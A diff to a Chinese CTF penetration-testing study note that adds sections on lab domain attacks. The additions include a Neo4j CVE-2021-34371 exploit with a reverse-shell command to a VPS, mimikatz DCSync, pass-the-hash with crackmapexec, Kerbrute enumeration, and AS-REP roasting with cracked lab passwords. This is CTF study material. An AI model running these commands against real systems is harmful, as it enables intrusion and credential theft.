@@ -1,8 +1,7 @@
 # CTF-渗透测试
 
-越来越多的线下赛开始考察实战渗透了，一直想学渗透来着
+**越来越多 CTF 比赛的赛制都改成实战渗透了，因此想用这篇文章来学习并总结一下**
 
-但无奈一直被耽搁，回过头来的时候发现自己已经要退役了
 <!--more-->
 
 ## 前置基础知识
@@ -811,7 +810,7 @@ curl -L https://github.com/carlospolop/PEASS-ng/releases/download/20231002-59c6f
 
 ## 常用C2及代理工具的使用
 
-### CobaltStrike
+### CobaltStrike(适用于外网机是 Windows 的情况)
 
 #### 服务端及客户端连接
 
@@ -895,7 +894,7 @@ upload C:\tmp\fscan.exe (C:\Users\public\fscan.exe)
 
 ![](imgs/image-20251113105838839.png)
 
-### vshell
+### vshell(适用于外网机是 Linux 的情况)
 
 首先上传 `v_linux_amd64` 目录到VPS
 
@@ -1206,6 +1205,22 @@ proxychains python3 WpCargo.py -t http://172.22.2.18
 
 ![](imgs/image-20251113001514641.png)
 
+#### neo4j 漏洞利用
+
+**默认用户名和密码：neo4j/neo4j**
+
+##### Shell Server反序列化漏洞(CVE-2021-34371)
+
+Neo4j <= 3.4.18
+
+如果开启了Neo4j Shell接口，可以通过RMI协议调用任意方法
+
+https://github.com/zwjjustdoit/CVE-2021-34371.jar
+
+```bash
+bash -i >& /dev/tcp/VPS_IP/PORT 0>&1
+java -jar rhino_gadget.jar rmi://39.99.133.227:1337 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9WUFNfSVAvUE9EVCAwPiYx}|{base64,-d}|{bash,-i}"
+```
 
 
 ### 数据库漏洞
@@ -1354,6 +1369,65 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution 
 
 ## 域渗透
 
+### mimikatz 导出哈希
+
+```bash
+.\mimikatz.exe "lsadump::dcsync /domain:xiaorang.lab /user:Administrator" exit
+```
+
+
+### BloodHound+Sharphound分析域内环境
+
+#### 安装步骤
+
+> 新版的kali(2025.3)如果使用 apt 安装的话，新版的BloodHound默认是要用邮箱登录的
+> 
+> 因此我这里推荐手动安装老版本的BloodHound
+
+首先我们需要去下载这两个安装包：neo4j-community-4.4.46-unix.tar和BloodHound-linux-x64.zip
+
+neo4j 可以直接去neo4j官网上下载社区版：
+
+https://neo4j.com/download-thanks/?edition=community&release=4.4.46
+
+BloodHound直接去 Github 上下载即可：
+
+https://github.com/SpecterOps/BloodHound-Legacy
+
+下载好后解压，然后运行以下命令启动一下 neo4j
+
+初次使用先用默认用户名和密码登录 neo4j/neo4j，然后修改一下默认密码
+
+```bash
+cd neo4j-community-4.4.46/bin && ./neo4j console
+```
+
+neo4j 启动好后，我们运行以下命令启动BloodHound即可
+
+```bash
+./BloodHound --no-sandbox
+```
+
+然后输入我们之前修改好的密码登录，并上传我们Sharphound抓取的域内信息
+
+> 这里可能会遇到这个问题：https://breachar.medium.com/install-bloodhound-ce-under-kali-linux-2024-4-2a68feebdb62
+> 
+> 就是我们上传Sharphound抓取的压缩包时，会发现进度一直开在 0%
+> 
+> 这个其实是因为我们的Sharphound与BloodHound不匹配的问题
+> 
+> 我们使用BloodHound中collection目录中的Sharphound重新抓取并上传即可
+
+```bash
+.\SharpHound.exe -c all
+```
+
+![](imgs/image-20251118152732211.png)
+
+所有步骤都配置好后，即可导入Sharphound抓取的压缩包分析域内环境
+
+![](imgs/image-20251118152809022.png)
+
 ### 密码喷洒
 
 在得到域内的用户名和密码后，可以尝试用密码喷洒能登录哪一台主机然后进入域内
@@ -1379,7 +1453,6 @@ proxychains rdesktop 172.22.8.46 -u Aldrich -d xiaorang.lab -p 'Ald@rLMWuy7Z!#'
 如果kali下比较卡的话，我们用kali修改了密码后就用Windows自带的RDP连
 
 就是这里要注意用户名是：xiaorang.lab/Aldrich
-
 
 ### DCSync攻击
 
@@ -1408,8 +1481,12 @@ proxychains crackmapexec smb 172.22.1.2 -u administrator -H '10cf89a850fb1cdbe6b
 
 ### 哈希传递攻击
 
+到 kali 下用 crackmapexec 打即可
+
 ```bash
 proxychains crackmapexec smb 172.22.8.15 -u 'WIN2016$' -H '6ff4e8e360d48860f17ac7892923ae1c' -x 'type \Users\Administrator\flag\flag03.txt'
+proxychains crackmapexec smb 172.22.6.25 -u administrator -H '04d93ffd6f5f6e4490e0de23f240a5e9' -d 'xiaorang.lab' -x "type Users\Administrator\flag\flag03.txt"
+proxychains crackmapexec smb 172.22.6.12 -u administrator -H '04d93ffd6f5f6e4490e0de23f240a5e9' -d 'xiaorang.lab' -x "type Users\Administrator\flag\flag04.txt"
 ```
 
 ### 委派约束攻击
@@ -1424,6 +1501,37 @@ kekeo.exe "tgs::s4u /tgt:[0;3e4]-2-1-40e10000-MSSQLSERVER$@krbtgt-XIAORANG.LAB.k
 # 用mimikatz导入票据
 mimikatz.exe "kerberos::ptt TGS_Administrator@XIAORANG.LAB@XIAORANG.LAB_cifs~DC.XIAORANG.LAB@XIAORANG.LAB.kirbi"
 type \\DC.xiaorang.lab\C$\Users\Administrator\flag\flag04.txt
+```
+
+
+### Kerberos域渗透
+#### AS-REQ 域内用户名枚举攻击
+
+> 在kerberos的AS-REQ认证阶段，当cname值中的用户不存在时，返回包会提示KDC_ERR_C_PRINCIPAL_UNKNOWN。当用户名存在，密码正确和密码错误时，返回包会有所不同。所以当我们没有域凭证时，我们可以基于该差异对域用户进行用户枚举
+
+Kerbrute：[https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute)
+
+```powershell
+PS D:\MD\CTF\CTFD\Pentesting\kerbrute> .\kerbrute_windows_amd64.exe userenum --dc 172.22.6.12 -d xiaorang.lab -t 10 email.txt
+```
+
+#### AS-REP Roasting攻击
+
+> 对于域用户，如果设置了选项Do not require Kerberos preauthentication(不要求Kerberos预身份认证)，此时向域控制器的88端口发送AS-REQ请求，对收到的AS-REP内容重新组合，能够拼接成”Kerberos 5 AS-REP etype 23”(18200)的格式，接下来可以使用hashcat或是john对其破解，最终获得该用户的明文口令。默认情况下该配置不会设置。
+
+```bash
+┌──(kali㉿kali)-[~/Desktop]
+└─$ proxychains GetNPUsers.py -dc-ip 172.22.6.12 -usersfile ~/Desktop/user.txt xiaorang.lab/
+$krb5asrep$23$wenshao@xiaorang.lab@XIAORANG.LAB:75dedf666220242b7bf22dee53e6da48$3ad0984e0740ff8bd97a202e3ce3927c5779fe27f91383d1f18d661ca465a3c4b51ac088a120f8a1eb39df81e0b76a03295b9e1061b3faa8f6dde2dedb7e0d00e2f12e773e982102820068a82acf31030a3b38a30b3504f78d3db5e0c43279cd06b93ae446eed735e958a654673734e4ccc92ffea11d1adc5074a46f1d0ebacc80da3f4f5011655bf6f30f5f2c5fe40d233cce647d7f98f30ee2fb983e8feecc98e6ef0387e376f16d91699f5793da876bdd20b89901f7b6f2656eeff740a2e715b84d8404cc6a8cf3f90437bb9b5ec7ff49e9c923814d285bd97c2dcbbf0233122e7d5557a2e6e0bb38689c
+$krb5asrep$23$zhangxin@xiaorang.lab@XIAORANG.LAB:1653303eb6c1e87ba5d22ec12b2c425d$c6436466e54106082b888caa218f872a3b927acc14c647aa7a2e4446856c1d72500255f258d34d765b565588ccdcc32eb8f24159e3486dbf1a977e7e7b21f267e4cb24293a34f6a031515f7da1a826bf7085d61041b0ad52926d20d0764370973ea291c68cd16a2111c7ca8f6c5000d8231cd22daad1eb6fb0c5dd3c6e659e55712f8b2a6865016f119cdfc83f2020654ba7e9140a46bc3fb5cc0bb98325ec934d6827b8f15be06ee612d4eac84c02e4bc423800cbe9bbed0f3217883be8b50880ff73156131235d61dd198fc6bc105a421f49317be4a69c8b448e9195e38d16c62836c6b20ad4510016b781
+```
+
+```bash
+.\hashcat -m 18200 -a 0 hash1.txt .\rockyou.txt
+$krb5asrep23wenshao@xiaorang.lab@XIAORANG.LAB:75dedf666220242b7bf22dee53e6da48$3ad0984e0740ff8bd97a202e3ce3927c5779fe27f91383d1f18d661ca465a3c4b51ac088a120f8a1eb39df81e0b76a03295b9e1061b3faa8f6dde2dedb7e0d00e2f12e773e982102820068a82acf31030a3b38a30b3504f78d3db5e0c43279cd06b93ae446eed735e958a654673734e4ccc92ffea11d1adc5074a46f1d0ebacc80da3f4f5011655bf6f30f5f2c5fe40d233cce647d7f98f30ee2fb983e8feecc98e6ef0387e376f16d91699f5793da876bdd20b89901f7b6f2656eeff740a2e715b84d8404cc6a8cf3f90437bb9b5ec7ff49e9c923814d285bd97c2dcbbf0233122e7d5557a2e6e0bb38689c:hellokitty
+
+.\hashcat -m 18200 -a 0 hash2.txt .\rockyou.txt
+$krb5asrep23zhangxin@xiaorang.lab@XIAORANG.LAB:1653303eb6c1e87ba5d22ec12b2c425d$c6436466e54106082b888caa218f872a3b927acc14c647aa7a2e4446856c1d72500255f258d34d765b565588ccdcc32eb8f24159e3486dbf1a977e7e7b21f267e4cb24293a34f6a031515f7da1a826bf7085d61041b0ad52926d20d0764370973ea291c68cd16a2111c7ca8f6c5000d8231cd22daad1eb6fb0c5dd3c6e659e55712f8b2a6865016f119cdfc83f2020654ba7e9140a46bc3fb5cc0bb98325ec934d6827b8f15be06ee612d4eac84c02e4bc423800cbe9bbed0f3217883be8b50880ff73156131235d61dd198fc6bc105a421f49317be4a69c8b448e9195e38d16c62836c6b20ad4510016b781:strawberry
 ```
 
 
